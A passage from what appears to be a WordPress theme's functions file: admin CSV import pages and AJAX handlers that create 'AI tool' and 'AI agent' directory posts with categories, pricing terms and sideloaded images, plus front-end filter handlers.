                    $logo_id = attachment_url_to_postid($logo_url);
                }
                
                // If not found, try to sideload the image
                if (!$logo_id) {
                    $file_array = array();
                    $file_array['name'] = basename($logo_url);
                    
                    // Download file to temp location
                    $file_array['tmp_name'] = download_url($logo_url);
                    
                    if (!is_wp_error($file_array['tmp_name'])) {
                        // Handle the upload
                        $logo_id = media_handle_sideload($file_array, $post_id, $data['title']);
                        
                        // Delete temp file
                        @unlink($file_array['tmp_name']);
                    }
                }
                
                if (!is_wp_error($logo_id)) {
                    update_post_meta($post_id, '_logo', wp_get_attachment_url($logo_id));
                } else {
                    $errors[] = "Failed to import logo for '{$data['title']}': " . $logo_id->get_error_message();
                }
            }
            
            // Handle featured image
            if (!empty($data['image'])) {
                $image_url = esc_url_raw($data['image']);
                $image_id = 0;
                
                // Try to get attachment ID by URL first
                if (function_exists('attachment_url_to_postid')) {
                    $image_id = attachment_url_to_postid($image_url);
                }
                
                // If not found, try to sideload the image
                if (!$image_id) {
                    $file_array = array();
                    $file_array['name'] = basename($image_url);
                    
                    // Download file to temp location
                    $file_array['tmp_name'] = download_url($image_url);
                    
                    if (!is_wp_error($file_array['tmp_name'])) {
                        // Handle the upload
                        $image_id = media_handle_sideload($file_array, $post_id, $data['title']);
                        
                        // Delete temp file
                        @unlink($file_array['tmp_name']);
                    }
                }
                
                if (!is_wp_error($image_id)) {
                    set_post_thumbnail($post_id, $image_id);
                } else {
                    $errors[] = "Failed to import featured image for '{$data['title']}': " . $image_id->get_error_message();
                }
            }
            
            $imported++;
            
        } catch (Exception $e) {
            $errors[] = "Error processing '{$data['title']}': " . $e->getMessage();
        }
    }
    
    return array(
        'imported' => $imported,
        'errors' => $errors
    );
}

// CSV Import Page Content
// Helper function to get attachment ID by filename
function wb_get_attachment_id_by_filename($filename)
{
    global $wpdb;

    // Remove query strings from filename
    $filename = preg_replace('/\?.*$/', '', $filename);

    // Get just the filename without path
    $filename = basename($filename);

    // Search for the attachment in the database
    $attachment = $wpdb->get_var($wpdb->prepare(
        "SELECT post_id FROM $wpdb->postmeta 
        WHERE meta_key = '_wp_attached_file' 
        AND meta_value LIKE %s",
        '%' . $wpdb->esc_like($filename)
    ));

    return $attachment ? (int) $attachment : 0;
}

function ai_tool_csv_import_page() {
    // Increase execution time and memory limit for large imports
    @set_time_limit(0);
    @ini_set('memory_limit', '512M');
    
    // Ensure we have the required WordPress functions
    if (!function_exists('wp_max_upload_size')) {
        require_once(ABSPATH . 'wp-includes/formatting.php');
    }
    
    // Add error reporting for debugging
    if (defined('WP_DEBUG') && WP_DEBUG) {
        error_reporting(E_ALL);
        ini_set('display_errors', 1);
    }
    ?>
    <div class="wrap">
        <h1>Import AI Tools from CSV</h1>
        
        <!-- Progress Bar -->
        <div id="import-progress" style="display: none; margin: 20px 0;">
            <div id="progress-bar">
                <div id="progress-bar-fill"></div>
            </div>
            <div id="progress-text">Preparing import...</div>
            <div id="progress-details"></div>
        </div>
        
        <!-- Status Messages -->
        <div id="import-message" class="notice" style="display: none;"></div>
        
        <div class="card">
            <h2>Instructions</h2>
            <p>Upload a CSV file containing AI Tools data. The CSV should have the following columns:</p>
            <ul>
                <li><strong>title</strong> (Required) - Tool name</li>
                <li><strong>description</strong> (Required) - Detailed description</li>
                <li><strong>tagline</strong> (Optional) - Short description</li>
                <li><strong>web url</strong> (Optional) - Tool website URL</li>
                <li><strong>logo</strong> (Optional) - URL to logo image</li>
                <li><strong>image</strong> (Optional) - URL to featured image</li>
                <li><strong>option price</strong> (Optional) - Price amount</li>
                <li><strong>currency</strong> (Optional) - Currency code</li>
                <li><strong>label</strong> (Optional) - Comma-separated categories</li>
                <li><strong>Features</strong> (Optional) - Comma-separated features</li>
                <li><strong>pricing model</strong> (Optional) - Comma-separated pricing options</li>
            </ul>
            <p><strong>Note:</strong> Large files will be processed in batches to prevent timeouts.</p>
        </div>
        
        <form id="csv-import-form" method="post" enctype="multipart/form-data">
            <?php wp_nonce_field('ai_tool_csv_import', 'ai_tool_csv_import_nonce'); ?>
            <table class="form-table">
                <tr>
                    <th><label for="csv_file">CSV File</label></th>
                    <td>
                        <input type="file" name="csv_file" id="csv_file" accept=".csv" required>
                        <p class="description">Maximum file size: <?php echo size_format(wp_max_upload_size()); ?></p>
                    </td>
                </tr>
            </table>
            <p class="submit">
                <button type="submit" id="submit-import" class="button button-primary">Start Import</button>
                <span class="spinner" style="float: none; margin-top: 4px;"></span>
            </p>
        </form>
        <?php
        // Process the form submission
        if (isset($_POST['submit_csv_import']) && isset($_FILES['csv_file'])) {
            if (!wp_verify_nonce($_POST['ai_tool_csv_import_nonce'], 'ai_tool_csv_import')) {
                wp_die('Security check failed');
            }
            if (!current_user_can('manage_options')) {
                wp_die('You do not have sufficient permissions to access this page.');
            }
            $file = $_FILES['csv_file'];
            if ($file['error'] !== UPLOAD_ERR_OK) {
                echo '<div class="error"><p>Error uploading file. Please try again.</p></div>';
            } else {
                $handle = fopen($file['tmp_name'], 'r');
                if ($handle !== false) {
                    $headers = fgetcsv($handle);
                    $row = 2;
                    $imported = 0;
                    $errors = array();
                    while (($data = fgetcsv($handle)) !== false) {
                        try {
                            // Required fields
                            $title = isset($data[0]) ? trim($data[0]) : '';
                            $description = isset($data[1]) ? trim($data[1]) : '';
                            if (empty($title) || empty($description)) {
                                $errors[] = "Row $row: Title and Description are required.";
                                $row++;
                                continue;
                            }
                            $tagline = isset($data[2]) ? trim($data[2]) : '';
                            $labels = isset($data[3]) ? array_map('trim', explode(',', $data[3])) : array();
                            $web_url = isset($data[4]) ? trim($data[4]) : '';
                            $pricing_options = isset($data[5]) ? array_map('trim', explode(',', $data[5])) : array();
                            $features = isset($data[6]) ? array_map('trim', explode(',', $data[6])) : array();
                            $logo_url = isset($data[7]) ? trim($data[7]) : '';
                            $image_url = isset($data[8]) ? trim($data[8]) : '';
                            $amount = isset($data[9]) ? trim($data[9]) : '';
                            $currency = isset($data[10]) ? trim($data[10]) : '';
                            // Create post
                            $post_data = array(
                                'post_title' => $title,
                                'post_content' => $description,
                                'post_excerpt' => $tagline,
                                'post_status' => 'publish',
                                'post_type' => 'ai-tool'
                            );
                            $post_id = wp_insert_post($post_data);
                            if (!is_wp_error($post_id)) {
                                // Categories (ai-tool-category)
                                if (!empty($labels)) {
                                    foreach ($labels as $cat) {
                                        if (!term_exists($cat, 'ai-tool-category')) {
                                            wp_insert_term($cat, 'ai-tool-category');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $labels, 'ai-tool-category');
                                }
                                // Pricing Options (ai-tool-pricing-option)
                                if (!empty($pricing_options)) {
                                    foreach ($pricing_options as $opt) {
                                        if (!term_exists($opt, 'ai-tool-pricing-option')) {
                                            wp_insert_term($opt, 'ai-tool-pricing-option');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $pricing_options, 'ai-tool-pricing-option');
                                }
                                // Features/Tags (ai-tool-tag)
                                if (!empty($features)) {
                                    foreach ($features as $tag) {
                                        if (!term_exists($tag, 'ai-tool-tag')) {
                                            wp_insert_term($tag, 'ai-tool-tag');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $features, 'ai-tool-tag');
                                }
                                // Website URL
                                if (!empty($web_url)) {
                                    update_post_meta($post_id, '_website_url', esc_url_raw($web_url));
                                }
                                // Amount
                                if (!empty($amount)) {
                                    update_post_meta($post_id, '_amount', $amount);
                                }
                                // Currency
                                if (!empty($currency)) {
                                    update_post_meta($post_id, '_currency', $currency);
                                }
                                // Handle Logo (check if exists before uploading)
                                if (!empty($logo_url)) {
                                    // First check if the image already exists in the media library
                                    $existing_logo_id = wb_get_attachment_id_by_filename($logo_url);

                                    if ($existing_logo_id) {
                                        // Use existing attachment
                                        $logo_url_attached = wp_get_attachment_url($existing_logo_id);
                                        update_post_meta($post_id, '_logo', $logo_url_attached);
                                    } else {
                                        // Download and upload the image if it doesn't exist
                                        require_once (ABSPATH . 'wp-admin/includes/file.php');
                                        require_once (ABSPATH . 'wp-admin/includes/media.php');
                                        require_once (ABSPATH . 'wp-admin/includes/image.php');

                                        $logo_id = media_sideload_image($logo_url, $post_id, '', 'id');
                                        if (!is_wp_error($logo_id)) {
                                            $logo_url_attached = wp_get_attachment_url($logo_id);
                                            update_post_meta($post_id, '_logo', $logo_url_attached);
                                        } else {
                                            update_post_meta($post_id, '_logo', $logo_url);  // fallback: store URL
                                        }
                                    }
                                }

                                // Handle Featured Image (check if exists before uploading)
                                if (!empty($image_url)) {
                                    // First check if the image already exists in the media library
                                    $existing_image_id = wb_get_attachment_id_by_filename($image_url);

                                    if ($existing_image_id) {
                                        // Use existing attachment
                                        set_post_thumbnail($post_id, $existing_image_id);
                                    } else {
                                        // Download and upload the image if it doesn't exist
                                        require_once (ABSPATH . 'wp-admin/includes/file.php');
                                        require_once (ABSPATH . 'wp-admin/includes/media.php');
                                        require_once (ABSPATH . 'wp-admin/includes/image.php');

                                        $image_id = media_sideload_image($image_url, $post_id, '', 'id');
                                        if (!is_wp_error($image_id)) {
                                            set_post_thumbnail($post_id, $image_id);
                                        }
                                    }
                                }
                                $imported++;
                            } else {
                                $errors[] = "Row $row: Failed to create post - " . $post_id->get_error_message();
                            }
                        } catch (Exception $e) {
                            $errors[] = "Row $row: " . $e->getMessage();
                        }
                        $row++;
                    }
                    fclose($handle);
                    echo '<div class="notice notice-success"><p>Successfully imported ' . $imported . ' AI Tools.</p></div>';
                    if (!empty($errors)) {
                        echo '<div class="notice notice-error"><p>Errors occurred during import:</p><ul>';
                        foreach ($errors as $error) {
                            echo '<li>' . esc_html($error) . '</li>';
                        }
                        echo '</ul></div>';
                    }
                } else {
                    echo '<div class="error"><p>Error reading CSV file. Please try again.</p></div>';
                }
            }
        }
        ?>
    </div>
<?php
}

// Add CSV Import Menu for AI Agents
function add_ai_agent_csv_import_menu() {
    add_submenu_page(
        'edit.php?post_type=ai-agent',
        'Import AI Agents from CSV',
        'Import from CSV',
        'manage_options',
        'ai-agent-csv-import',
        'ai_agent_csv_import_page'
    );
}

add_action('admin_menu', 'add_ai_agent_csv_import_menu');

// Enqueue scripts for the AI Agents import page
function enqueue_ai_agents_import_scripts($hook) {
    if ('ai-agent_page_ai-agent-csv-import' !== $hook) {
        return;
    }
    
    wp_enqueue_script('ai-agents-import', 
        get_template_directory_uri() . '/js/ai-agents-import.js', 
        array('jquery'), 
        filemtime(get_template_directory() . '/js/ai-agents-import.js'), 
        true
    );
    
    wp_localize_script('ai-agents-import', 'aiAgentsImport', array(
        'ajaxurl' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('ai_agents_import_nonce')
    ));
    
    wp_enqueue_style('ai-agents-import', 
        get_template_directory_uri() . '/css/ai-agents-import.css', 
        array(), 
        filemtime(get_template_directory() . '/css/ai-agents-import.css')
    );
}
add_action('admin_enqueue_scripts', 'enqueue_ai_agents_import_scripts');

// AJAX handler to start the AI Agents import process
add_action('wp_ajax_start_ai_agents_import', 'handle_start_ai_agents_import');
function handle_start_ai_agents_import() {
    // Verify nonce and permissions
    if (!check_ajax_referer('ai_agents_import_nonce', 'nonce', false)) {
        wp_send_json_error('Invalid nonce');
    }
    
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Insufficient permissions');
    }
    
    // Get the uploaded file
    if (empty($_FILES['file'])) {
        wp_send_json_error('No file uploaded');
    }
    
    $file = $_FILES['file'];
    
    // Check for upload errors
    if ($file['error'] !== UPLOAD_ERR_OK) {
        wp_send_json_error('File upload error: ' . $file['error']);
    }
    
    // Parse the CSV into chunks
    $csv_data = array_map('str_getcsv', file($file['tmp_name']));
    $header = array_shift($csv_data);
    $chunks = array_chunk($csv_data, 50); // 50 rows per chunk
    
    // Store chunks in a transient (expires in 1 hour)
    $import_id = 'ai_agents_import_' . time();
    set_transient($import_id, array(
        'total' => count($csv_data),
        'processed' => 0,
        'chunks' => $chunks,
        'header' => $header,
        'errors' => array()
    ), HOUR_IN_SECONDS);
    
    wp_send_json_success(array(
        'import_id' => $import_id,
        'total_chunks' => count($chunks),
        'total_rows' => count($csv_data)
    ));
}

// AJAX handler to process a single chunk of AI Agents
add_action('wp_ajax_process_ai_agents_chunk', 'handle_process_ai_agents_chunk');
function handle_process_ai_agents_chunk() {
    // Verify nonce and permissions
    if (!check_ajax_referer('ai_agents_import_nonce', 'nonce', false)) {
        wp_send_json_error('Invalid nonce');
    }
    
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Insufficient permissions');
    }
    
    $import_id = sanitize_text_field($_POST['import_id']);
    $chunk_index = intval($_POST['chunk_index']);
    
    // Get the import data
    $import_data = get_transient($import_id);
    if (empty($import_data)) {
        wp_send_json_error('Import session expired or invalid');
    }
    
    // Process the current chunk
    $chunk = $import_data['chunks'][$chunk_index];
    $results = process_ai_agents_chunk($chunk, $import_data['header']);
    
    // Update import progress
    $import_data['processed'] += count($chunk);
    $import_data['errors'] = array_merge($import_data['errors'], $results['errors']);
    set_transient($import_id, $import_data, HOUR_IN_SECONDS);
    
    wp_send_json_success(array(
        'processed' => $import_data['processed'],
        'total' => $import_data['total'],
        'current_chunk' => $chunk_index + 1,
        'total_chunks' => count($import_data['chunks']),
        'errors' => $results['errors']
    ));
}

// Process a single chunk of AI Agents CSV data
function process_ai_agents_chunk($rows, $header) {
    // Ensure we have the required WordPress functions
    if (!function_exists('wp_handle_upload')) {
        require_once(ABSPATH . 'wp-admin/includes/file.php');
    }
    
    if (!function_exists('wp_generate_attachment_metadata')) {
        require_once(ABSPATH . 'wp-admin/includes/image.php');
    }
    
    if (!function_exists('media_handle_upload')) {
        require_once(ABSPATH . 'wp-admin/includes/media.php');
    }
    
    $errors = array();
    $imported = 0;
    
    foreach ($rows as $row) {
        if (count($row) !== count($header)) {
            $errors[] = "Skipping malformed row: " . implode(',', array_slice($row, 0, 5)) . (count($row) > 5 ? '...' : '');
            continue;
        }
        
        $data = array_combine($header, $row);
        
        // Skip empty rows
        if (empty($data['title']) || empty($data['description'])) {
            $errors[] = "Skipping row: Missing required fields (title or description)";
            continue;
        }
        
        try {
            // Prepare post data
            $post_data = array(
                'post_title'   => sanitize_text_field($data['title']),
                'post_content' => wp_kses_post($data['description']),
                'post_status'  => 'publish',
                'post_type'    => 'ai-agent',
                'post_excerpt' => !empty($data['tagline']) ? sanitize_text_field($data['tagline']) : ''
            );
            
            // Insert the post
            $post_id = wp_insert_post($post_data, true);
            
            if (is_wp_error($post_id)) {
                throw new Exception($post_id->get_error_message());
            }
            
            // Handle categories
            if (!empty($data['label'])) {
                $categories = array_map('trim', explode(',', $data['label']));
                $category_terms = array();
                
                foreach ($categories as $category) {
                    if (!empty($category)) {
                        $term = term_exists($category, 'ai-agent-category');
                        if (!$term) {
                            $term = wp_insert_term($category, 'ai-agent-category');
                        }
                        if (!is_wp_error($term) && isset($term['term_id'])) {
                            $category_terms[] = $term['term_id'];
                        }
                    }
                }
                
                if (!empty($category_terms)) {
                    wp_set_object_terms($post_id, $category_terms, 'ai-agent-category');
                }
            }
            
            // Handle features as tags
            if (!empty($data['Features'])) {
                $features = array_map('trim', explode(',', $data['Features']));
                $features = array_filter($features);
                if (!empty($features)) {
                    wp_set_object_terms($post_id, $features, 'ai-agent-tag');
                }
            }
            
            // Handle pricing options
            if (!empty($data['pricing model'])) {
                $pricing_options = array_map('trim', explode(',', $data['pricing model']));
                $pricing_terms = array();
                
                foreach ($pricing_options as $option) {
                    if (!empty($option)) {
                        $term = term_exists($option, 'ai-agent-pricing-option');
                        if (!$term) {
                            $term = wp_insert_term($option, 'ai-agent-pricing-option');
                        }
                        if (!is_wp_error($term) && isset($term['term_id'])) {
                            $pricing_terms[] = $term['term_id'];
                        }
                    }
                }
                
                if (!empty($pricing_terms)) {
                    wp_set_object_terms($post_id, $pricing_terms, 'ai-agent-pricing-option');
                }
            }
            
            // Set meta fields
            if (!empty($data['web url'])) {
                update_post_meta($post_id, '_website_url', esc_url_raw($data['web url']));
            }
            
            if (!empty($data['option price'])) {
                update_post_meta($post_id, '_amount', sanitize_text_field($data['option price']));
            }
            
            if (!empty($data['currency'])) {
                update_post_meta($post_id, '_currency', sanitize_text_field($data['currency']));
            }
            
            // Handle logo image
            if (!empty($data['logo'])) {
                $logo_url = esc_url_raw($data['logo']);
                $logo_id = 0;
                
                // Try to get attachment ID by URL first
                if (function_exists('attachment_url_to_postid')) {
                    $logo_id = attachment_url_to_postid($logo_url);
                }
                
                // If not found, try to sideload the image
                if (!$logo_id) {
                    $file_array = array();
                    $file_array['name'] = basename($logo_url);
                    
                    // Download file to temp location
                    $file_array['tmp_name'] = download_url($logo_url);
                    
                    if (!is_wp_error($file_array['tmp_name'])) {
                        // Handle the upload
                        $logo_id = media_handle_sideload($file_array, $post_id, $data['title']);
                        
                        // Delete temp file
                        @unlink($file_array['tmp_name']);
                    }
                }
                
                if (!is_wp_error($logo_id)) {
                    update_post_meta($post_id, '_logo', wp_get_attachment_url($logo_id));
                } else {
                    $errors[] = "Failed to import logo for '{$data['title']}': " . $logo_id->get_error_message();
                }
            }
            
            // Handle featured image
            if (!empty($data['image'])) {
                $image_url = esc_url_raw($data['image']);
                $image_id = 0;
                
                // Try to get attachment ID by URL first
                if (function_exists('attachment_url_to_postid')) {
                    $image_id = attachment_url_to_postid($image_url);
                }
                
                // If not found, try to sideload the image
                if (!$image_id) {
                    $file_array = array();
                    $file_array['name'] = basename($image_url);
                    
                    // Download file to temp location
                    $file_array['tmp_name'] = download_url($image_url);
                    
                    if (!is_wp_error($file_array['tmp_name'])) {
                        // Handle the upload
                        $image_id = media_handle_sideload($file_array, $post_id, $data['title']);
                        
                        // Delete temp file
                        @unlink($file_array['tmp_name']);
                    }
                }
                
                if (!is_wp_error($image_id)) {
                    set_post_thumbnail($post_id, $image_id);
                } else {
                    $errors[] = "Failed to import featured image for '{$data['title']}': " . $image_id->get_error_message();
                }
            }
            
            $imported++;
            
        } catch (Exception $e) {
            $errors[] = "Error processing '{$data['title']}': " . $e->getMessage();
        }
    }
    
    return array(
        'imported' => $imported,
        'errors' => $errors
    );
}

// CSV Import Page Content for AI Agents
function ai_agent_csv_import_page() {
    // Increase execution time and memory limit for large imports
    @set_time_limit(0);
    @ini_set('memory_limit', '512M');
    
    // Ensure we have the required WordPress functions
    if (!function_exists('wp_max_upload_size')) {
        require_once(ABSPATH . 'wp-includes/formatting.php');
    }
    
    // Add error reporting for debugging
    if (defined('WP_DEBUG') && WP_DEBUG) {
        error_reporting(E_ALL);
        ini_set('display_errors', 1);
    }
    ?>
    <div class="wrap">
        <h1>Import AI Agents from CSV</h1>
        
        <!-- Progress Bar -->
        <div id="import-progress" style="display: none; margin: 20px 0;">
            <div id="progress-bar">
                <div id="progress-bar-fill"></div>
            </div>
            <div id="progress-text">Preparing import...</div>
            <div id="progress-details"></div>
        </div>
        
        <!-- Status Messages -->
        <div id="import-message" class="notice" style="display: none;"></div>
        
        <div class="card">
            <h2>Instructions</h2>
            <p>Upload a CSV file containing AI Agents data. The CSV should have the following columns:</p>
            <ul>
                <li><strong>title</strong> (Required) - Agent name</li>
                <li><strong>description</strong> (Required) - Detailed description</li>
                <li><strong>tagline</strong> (Optional) - Short description</li>
                <li><strong>web url</strong> (Optional) - Agent website URL</li>
                <li><strong>logo</strong> (Optional) - URL to logo image</li>
                <li><strong>image</strong> (Optional) - URL to featured image</li>
                <li><strong>option price</strong> (Optional) - Price amount</li>
                <li><strong>currency</strong> (Optional) - Currency code</li>
                <li><strong>label</strong> (Optional) - Comma-separated categories</li>
                <li><strong>Features</strong> (Optional) - Comma-separated features</li>
                <li><strong>pricing model</strong> (Optional) - Comma-separated pricing options</li>
            </ul>
            <p><strong>Note:</strong> Large files will be processed in batches to prevent timeouts.</p>
        </div>
        
        <form id="csv-import-form" method="post" enctype="multipart/form-data">
            <?php wp_nonce_field('ai_agent_csv_import', 'ai_agent_csv_import_nonce'); ?>
            <table class="form-table">
                <tr>
                    <th><label for="csv_file">CSV File</label></th>
                    <td>
                        <input type="file" name="csv_file" id="csv_file" accept=".csv" required>
                        <p class="description">Maximum file size: <?php echo size_format(wp_max_upload_size()); ?></p>
                    </td>
                </tr>
            </table>
            <p class="submit">
                <button type="submit" id="submit-import" class="button button-primary">Start Import</button>
                <span class="spinner" style="float: none; margin-top: 4px;"></span>
            </p>
        </form>
        <?php
        // Process the form submission
        if (isset($_POST['submit_csv_import']) && isset($_FILES['csv_file'])) {
            if (!wp_verify_nonce($_POST['ai_agent_csv_import_nonce'], 'ai_agent_csv_import')) {
                wp_die('Security check failed');
            }
            if (!current_user_can('manage_options')) {
                wp_die('You do not have sufficient permissions to access this page.');
            }
            $file = $_FILES['csv_file'];
            if ($file['error'] !== UPLOAD_ERR_OK) {
                echo '<div class="error"><p>Error uploading file. Please try again.</p></div>';
            } else {
                $handle = fopen($file['tmp_name'], 'r');
                if ($handle !== false) {
                    $headers = fgetcsv($handle);
                    $row = 2;
                    $imported = 0;
                    $errors = array();
                    while (($data = fgetcsv($handle)) !== false) {
                        try {
                            $title = isset($data[0]) ? trim($data[0]) : '';
                            $description = isset($data[1]) ? trim($data[1]) : '';
                            if (empty($title) || empty($description)) {
                                $errors[] = "Row $row: Title and Description are required.";
                                $row++;
                                continue;
                            }
                            $tagline = isset($data[2]) ? trim($data[2]) : '';
                            $labels = isset($data[3]) ? array_map('trim', explode(',', $data[3])) : array();
                            $web_url = isset($data[4]) ? trim($data[4]) : '';
                            $pricing_options = isset($data[5]) ? array_map('trim', explode(',', $data[5])) : array();
                            $features = isset($data[6]) ? array_map('trim', explode(',', $data[6])) : array();
                            $logo_url = isset($data[7]) ? trim($data[7]) : '';
                            $image_url = isset($data[8]) ? trim($data[8]) : '';
                            $amount = isset($data[9]) ? trim($data[9]) : '';
                            $currency = isset($data[10]) ? trim($data[10]) : '';
                            $post_data = array(
                                'post_title' => $title,
                                'post_content' => $description,
                                'post_excerpt' => $tagline,
                                'post_status' => 'publish',
                                'post_type' => 'ai-agent'
                            );
                            $post_id = wp_insert_post($post_data);
                            if (!is_wp_error($post_id)) {
                                if (!empty($labels)) {
                                    foreach ($labels as $cat) {
                                        if (!term_exists($cat, 'ai-agent-category')) {
                                            wp_insert_term($cat, 'ai-agent-category');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $labels, 'ai-agent-category');
                                }
                                if (!empty($pricing_options)) {
                                    foreach ($pricing_options as $opt) {
                                        if (!term_exists($opt, 'ai-agent-pricing-option')) {
                                            wp_insert_term($opt, 'ai-agent-pricing-option');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $pricing_options, 'ai-agent-pricing-option');
                                }
                                if (!empty($features)) {
                                    foreach ($features as $tag) {
                                        if (!term_exists($tag, 'ai-agent-tag')) {
                                            wp_insert_term($tag, 'ai-agent-tag');
                                        }
                                    }
                                    wp_set_object_terms($post_id, $features, 'ai-agent-tag');
                                }
                                if (!empty($web_url)) {
                                    update_post_meta($post_id, '_website_url', esc_url_raw($web_url));
                                }
                                if (!empty($amount)) {
                                    update_post_meta($post_id, '_amount', $amount);
                                }
                                if (!empty($currency)) {
                                    update_post_meta($post_id, '_currency', $currency);
                                }
                                if (!empty($logo_url)) {
                                    $existing_logo_id = wb_get_attachment_id_by_filename($logo_url);

                                    if ($existing_logo_id) {
                                        // Use existing attachment
                                        $logo_url_attached = wp_get_attachment_url($existing_logo_id);
                                        update_post_meta($post_id, '_logo', $logo_url_attached);
                                    } else {
                                        // Download and upload the image if it doesn't exist
                                        require_once (ABSPATH . 'wp-admin/includes/file.php');
                                        require_once (ABSPATH . 'wp-admin/includes/media.php');
                                        require_once (ABSPATH . 'wp-admin/includes/image.php');

                                        $logo_id = media_sideload_image($logo_url, $post_id, '', 'id');
                                        if (!is_wp_error($logo_id)) {
                                            $logo_url_attached = wp_get_attachment_url($logo_id);
                                            update_post_meta($post_id, '_logo', $logo_url_attached);
                                        } else {
                                            update_post_meta($post_id, '_logo', $logo_url);
                                        }
                                    }
                                }
                                if (!empty($image_url)) {
                                    $existing_image_id = wb_get_attachment_id_by_filename($image_url);

                                    if ($existing_image_id) {
                                        // Use existing attachment
                                        set_post_thumbnail($post_id, $existing_image_id);
                                    } else {
                                        // Download and upload the image if it doesn't exist
                                        require_once (ABSPATH . 'wp-admin/includes/file.php');
                                        require_once (ABSPATH . 'wp-admin/includes/media.php');
                                        require_once (ABSPATH . 'wp-admin/includes/image.php');

                                        $image_id = media_sideload_image($image_url, $post_id, '', 'id');
                                        if (!is_wp_error($image_id)) {
                                            set_post_thumbnail($post_id, $image_id);
                                        }
                                    }
                                }
                                $imported++;
                            } else {
                                $errors[] = "Row $row: Failed to create post - " . $post_id->get_error_message();
                            }
                        } catch (Exception $e) {
                            $errors[] = "Row $row: " . $e->getMessage();
                        }
                        $row++;
                    }
                    fclose($handle);
                    echo '<div class="notice notice-success"><p>Successfully imported ' . $imported . ' AI Agents.</p></div>';
                    if (!empty($errors)) {
                        echo '<div class="notice notice-error"><p>Errors occurred during import:</p><ul>';
                        foreach ($errors as $error) {
                            echo '<li>' . esc_html($error) . '</li>';
                        }
                        echo '</ul></div>';
                    }
                } else {
                    echo '<div class="error"><p>Error reading CSV file. Please try again.</p></div>';
                }
            }
        }
        ?>
    </div>
<?php
}

function enqueue_alpinejs()
{
    wp_enqueue_script(
        'alpine-js',
        'https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js',
        [],
        null,
        true
    );
}

add_action('wp_enqueue_scripts', 'enqueue_alpinejs');

function ajax_filter_ai_tools()
{
    // Check for nonce security
    check_ajax_referer('filter_nonce', 'nonce');

    $args = array(
        'post_type' => 'ai-tool',
        'posts_per_page' => 16,
    );

    // Filter by category
    if (!empty($_POST['category'])) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-tool-category',
            'field' => 'slug',
            'terms' => $_POST['category'],
        );
    }

    // Filter by features
    if (!empty($_POST['features'])) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-tool-tag',
            'field' => 'slug',
            'terms' => $_POST['features'],
        );
    }

    // Filter by pricing options
    if (!empty($_POST['pricing'])) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-tool-pricing-option',
            'field' => 'slug',
            'terms' => $_POST['pricing'],
        );
    }

    $query = new WP_Query($args);

    if ($query->have_posts()):
        while ($query->have_posts()):
            $query->the_post();
            ?>
            <a href="<?php the_permalink(); ?>" class="no-d-hover block bg-[#B3C5FF1A] p-6 rounded-xl h-full flex flex-col border border-[var(--primary)]">
                <div class="flex flex-col flex-1 w-full gap-3">
                    <?php if (has_post_thumbnail()): ?>
                        <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover rounded-md']); ?>
                    <?php else: ?>
                        <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover rounded-md" />
                    <?php endif; ?>
                    <h1 class="text-[#1B1D1F] text-[20px] font-semibold"><?php the_title(); ?></h1>
                    <p class="text-[#5A6478] text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>

                </div>
            </a>
            <?php
        endwhile;
    else:
        echo '<p class="text-center w-full">' . __('No tools found.', 'wb') . '</p>';
    endif;

    wp_reset_postdata();
    wp_die();
}

add_action('wp_ajax_filter_ai_tools', 'ajax_filter_ai_tools');
add_action('wp_ajax_nopriv_filter_ai_tools', 'ajax_filter_ai_tools');

function enqueue_filter_scripts()
{
    wp_enqueue_script('filter-ajax', get_template_directory_uri() . '/js/filter-ajax.js', array('jquery'), null, true);
    wp_localize_script('filter-ajax', 'filter_vars', array(
        'ajax_url' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('filter_nonce')
    ));
}

add_action('wp_enqueue_scripts', 'enqueue_filter_scripts');

// Enqueue AI Agents filter script
function enqueue_ai_agents_filter_scripts()
{
    if (is_post_type_archive('ai-agent') || is_tax('ai-agent-category')) {
        wp_enqueue_script(
            'ai-agents-filter',
            get_template_directory_uri() . '/js/ai-agents-filter.js',
            array('jquery'),
            '1.0.0',
            true
        );

        // Localize script with ajax url and nonce
        wp_localize_script('ai-agents-filter', 'ajax_object', array(
            'ajax_url' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('ai_agents_filter_nonce')
        ));
    }
}

add_action('wp_enqueue_scripts', 'enqueue_ai_agents_filter_scripts');

// AJAX handler for filtering AI Agents
add_action('wp_ajax_filter_ai_agents', 'filter_ai_agents_callback');
add_action('wp_ajax_nopriv_filter_ai_agents', 'filter_ai_agents_callback');

function filter_ai_agents_callback()
{
    // Verify nonce
    if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'ai_agents_filter_nonce')) {
        wp_send_json_error('Invalid nonce');
    }

    // Get and sanitize input
    $category = isset($_POST['category']) ? sanitize_text_field($_POST['category']) : '';

    // Handle features - could be array or JSON string
    $features = array();
    if (isset($_POST['features'])) {
        if (is_array($_POST['features'])) {
            $features = array_map('sanitize_text_field', $_POST['features']);
        } elseif (is_string($_POST['features'])) {
            $decoded = json_decode(stripslashes($_POST['features']), true);
            $features = is_array($decoded) ? array_map('sanitize_text_field', $decoded) : array();
        }
    }

    // Handle pricing - could be array or JSON string
    $pricing = array();
    if (isset($_POST['pricing'])) {
        if (is_array($_POST['pricing'])) {
            $pricing = array_map('sanitize_text_field', $_POST['pricing']);
        } elseif (is_string($_POST['pricing'])) {
            $decoded = json_decode(stripslashes($_POST['pricing']), true);
            $pricing = is_array($decoded) ? array_map('sanitize_text_field', $decoded) : array();
        }
    }

    // Setup query args
    $args = array(
        'post_type' => 'ai-agent',
        'posts_per_page' => 12,
        'paged' => 1,  // Always show first page on filter
    );

    // Add category filter
    if (!empty($category)) {
        $args['tax_query'][] = array(
